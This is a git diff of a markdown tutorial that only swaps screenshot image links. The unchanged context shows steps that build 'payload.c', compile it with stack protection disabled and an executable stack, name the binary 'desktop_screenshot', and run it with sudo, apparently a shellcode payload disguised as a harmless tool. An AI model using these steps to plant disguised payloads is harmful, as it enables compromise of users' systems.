@@ -133,7 +133,7 @@ echo "  ret();" >> payload.c
 echo "}" >> payload.c
 ```
 
-![pic](http://i63.tinypic.com/2q07mg9.png)
+![pic](http://i63.tinypic.com/2wm1aax.png)
 
 <br />
 
@@ -143,7 +143,7 @@ echo "}" >> payload.c
 cat payload.c
 ```
 
-![pic](http://i67.tinypic.com/54f57p.png)
+![pic](http://i65.tinypic.com/wkh8h2.png)
 
 <br />
 
@@ -153,7 +153,7 @@ cat payload.c
 sudo gcc -fno-stack-protector -z execstack payload.c -o desktop_screenshot
 ```
 
-![pic](http://i63.tinypic.com/allx4w.png)
+![pic](http://i68.tinypic.com/15klg4.png)
 
 <br />
 
@@ -176,7 +176,7 @@ chmod +x desktop_screenshot
 sudo ./desktop_screenshot
 ```
 
-![pic](http://i67.tinypic.com/5vrhq1.png)
+![pic](http://i63.tinypic.com/24kzad1.png)
 
 <br />
 
